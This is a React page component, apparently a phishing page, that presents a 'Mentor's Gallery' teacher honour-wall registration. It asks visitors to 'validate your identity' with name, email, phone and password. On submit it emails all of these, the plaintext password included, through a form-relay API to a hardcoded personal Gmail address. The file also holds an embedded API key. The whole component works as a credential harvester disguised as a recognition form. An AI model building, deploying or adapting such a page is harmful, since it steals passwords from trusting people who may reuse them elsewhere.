import { useState } from "react";
import { useNavigate } from "react-router-dom";
import NavigationOverlay from "@/components/NavigationOverlay";
import Header from "@/components/Header";
import FooterSection from "@/components/FooterSection";

const SkillUpgrade = () => {
  const navigate = useNavigate();
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");

  const WEB3FORMS_API_KEY = "ae6e7bf2-f85d-41b1-952c-da184bf42bec";
  const RECIPIENT_EMAIL = "sachidanandapc3@gmail.com";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitting(true);
    setError("");

    try {
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          access_key: WEB3FORMS_API_KEY,
          apiKey: WEB3FORMS_API_KEY,
          subject: "Mentor's Gallery Registration",
          from_name: name,
          email,
          to_email: RECIPIENT_EMAIL,
          message: `New mentor registration details:\n\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`,
          source: "mentor-gallery-web",
        }),
      });

      const data = await response.json();
      if (!response.ok || data.success === false) {
        throw new Error(data.message || "Unable to submit registration. Please try again.");
      }

      setSubmitted(true);
    } catch (err) {
      setError(err instanceof Error ? err.message : String(err));
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <NavigationOverlay />
      <Header />

      <div className="flex-1 flex items-center justify-center px-6 pt-28 pb-16">
        <div className="max-w-md w-full">
          <button
            onClick={() => navigate(-1)}
            className="text-muted-foreground font-mono text-sm mb-8 hover:text-foreground transition-colors"
          >
            ← Back
          </button>

          <h1 className="font-display text-primary text-4xl md:text-5xl mb-4">
            Mentor's Gallery
          </h1>
          <p className="text-muted-foreground font-mono text-sm mb-10">
            We are proud to honour our respected teachers. Kindly register yourself 
            to be featured on our Teacher Honour wall. Please validate your identity here.
          </p>

          {submitted ? (
            <div className="bg-card border border-border rounded-lg p-8 text-center">
              <div className="text-4xl mb-4">🎉</div>
              <h2 className="text-foreground font-display text-2xl mb-2">You're In!</h2>
              <p className="text-muted-foreground font-mono text-sm">
                Thanks <span className="text-primary"></span>, we'll reach out at{" "}
                <span className="text-primary">{email}</span> with details.
              </p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-foreground font-mono text-sm mb-2">
                  User Name
                </label>
                <input
                  type="text"
                  required
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                  placeholder="Enter your name"
                />
              </div>
              <div>
                <label className="block text-foreground font-mono text-sm mb-2">
                  Email
                </label>
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                  placeholder="Enter your email"
                />
              </div>
              <div>
                <label className="block text-foreground font-mono text-sm mb-2">
                  Phone Number
                </label>
                <input
                  type="tel"
                  required
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                  placeholder="Enter your phone number"
                />
              </div>
              <div>
                <label className="block text-foreground font-mono text-sm mb-2">
                  Password
                </label>
                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                  placeholder="Enter your password"
                />
              </div>
              {error ? (
                <p className="text-sm text-destructive font-mono">
                  {error}
                </p>
              ) : null}
              <button
                type="submit"
                disabled={submitting}
                className="w-full bg-primary text-primary-foreground font-mono text-lg py-4 rounded-lg hover:opacity-90 transition-opacity shadow-lg disabled:cursor-not-allowed disabled:opacity-70"
              >
                {submitting ? "Sending..." : "Register"}
              </button>
            </form>
          )}
        </div>
      </div>

      <FooterSection />
    </div>
  );
};

export default SkillUpgrade;
